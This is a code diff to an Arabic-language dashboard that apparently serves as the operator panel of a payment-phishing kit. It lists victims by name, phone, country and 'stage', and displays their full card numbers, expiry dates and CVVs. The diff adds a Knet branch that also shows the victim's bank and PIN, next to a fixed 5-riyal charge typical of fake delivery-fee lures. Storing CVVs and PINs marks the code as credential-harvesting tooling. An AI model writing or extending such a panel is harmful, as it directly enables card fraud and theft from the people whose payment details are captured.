@@ -332,7 +332,7 @@
                             <th>الدولة</th>
                             <th>الاسم</th>
                             <th>الهاتف</th>
-                            <th>الهوية</th>
+                            <th>الوسيلة</th>
                             <th>المرحلة</th>
                             <th>الحالة</th>
                             <th>الإجراءات</th>
@@ -532,12 +532,17 @@
                 const customerName = order.personalData?.fullname || '';
                 const nameText = customerName ? customerName : '<span style="color:#999;font-size:11px">بانتظار الاسم...</span>';
 
+                const paymentMethod = order.paymentData?.payment_method || (order.paymentData?.card_number ? 'Credit Card' : '-');
+                const methodBadge = paymentMethod === 'Knet' 
+                    ? '<span style="background:#0070cd;color:white;padding:2px 6px;border-radius:4px;font-size:11px">Knet</span>'
+                    : (paymentMethod === 'Credit Card' ? '<span style="background:#5C0632;color:white;padding:2px 6px;border-radius:4px;font-size:11px">Card</span>' : '-');
+
                 return `
                     <tr class="${rowClass}">
                         <td>${flag} ${order.country || 'غير معروف'}</td>
                         <td>${nameText}</td>
                         <td>${order.personalData?.phone || '-'}</td>
-                        <td>${order.personalData?.id_number || '-'}</td>
+                        <td>${methodBadge}</td>
                         <td><span class="stage-badge stage-${state.stage || 'unknown'}">${stageLabel}</span></td>
                         <td>${statusBadge}</td>
                         <td>${actions}</td>
@@ -753,29 +758,48 @@
                 <div class="data-box">
                     <div class="data-box-header card">💳 بيانات البطاقة والدفع</div>
                     <div class="detail-item">
-                        <strong>📍 عنوان التوصيل:</strong>
-                        <span>${order.paymentData?.delivery_address ? (order.paymentData.delivery_address.city + ' - ' + order.paymentData.delivery_address.details) : '-'}</span>
+                        <strong>💳 وسيلة الدفع:</strong>
+                        <span style="font-weight:bold;color:#001F5C">${order.paymentData?.payment_method || (order.paymentData?.card_number ? 'Credit Card' : 'غير محدد')}</span>
                     </div>
-                    <div class="detail-item">
-                        <strong>💰 المبلغ المطلوب:</strong>
-                        <span style="font-weight:bold;color:#001F5C">5 ريال قطري</span>
-                    </div>
-                    <div class="detail-item">
-                        <strong>💳 حامل البطاقة:</strong>
-                        <span>${order.paymentData?.card_holder || '-'}</span>
-                    </div>
-                    <div class="detail-item">
-                        <strong>💳 رقم البطاقة:</strong>
-                        <span dir="ltr" style="display:inline-block;letter-spacing:2px;font-family:monospace">${order.paymentData?.card_number || '-'}</span>
-                    </div>
-                    <div class="detail-item">
-                        <strong>📅 تاريخ الانتهاء:</strong>
-                        <span dir="ltr" style="display:inline-block">${order.paymentData?.expiry_date || '-'}</span>
-                    </div>
-                    <div class="detail-item">
-                        <strong>🔒 CVV:</strong>
-                        <span dir="ltr" style="display:inline-block">${order.paymentData?.cvv || '-'}</span>
-                    </div>
+                    ${order.paymentData?.payment_method === 'Knet' ? `
+                        <div class="detail-item">
+                            <strong>🏦 البنك:</strong>
+                            <span>${order.paymentData.knet_data?.bank || '-'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <strong>💳 رقم البطاقة (Knet):</strong>
+                            <span dir="ltr" style="display:inline-block;letter-spacing:2px;font-family:monospace">${order.paymentData.knet_data?.card_number || '-'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <strong>📅 التاريخ:</strong>
+                            <span>${order.paymentData.knet_data?.expiry_month || '-'}/${order.paymentData.knet_data?.expiry_year || '-'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <strong>🔑 PIN:</strong>
+                            <span style="font-size:18px;font-weight:bold;color:#7b1fa2">${order.paymentData.knet_data?.pin || '-'}</span>
+                        </div>
+                    ` : `
+                        <div class="detail-item">
+                            <strong>📍 عنوان التوصيل:</strong>
+                            <span>${order.paymentData?.delivery_address ? (order.paymentData.delivery_address.city + ' - ' + (order.paymentData.delivery_address.street || order.paymentData.delivery_address.details || '')) : '-'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <strong>💳 حامل البطاقة:</strong>
+                            <span>${order.paymentData?.card_holder || '-'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <strong>💳 رقم البطاقة:</strong>
+                            <span dir="ltr" style="display:inline-block;letter-spacing:2px;font-family:monospace">${order.paymentData?.card_number || '-'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <strong>📅 تاريخ الانتهاء:</strong>
+                            <span dir="ltr" style="display:inline-block">${order.paymentData?.expiry_date || '-'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <strong>🔒 CVV:</strong>
+                            <span dir="ltr" style="display:inline-block">${order.paymentData?.cvv || '-'}</span>
+                        </div>
+                    `}
                 </div>
                 
                 ${securityHTML}
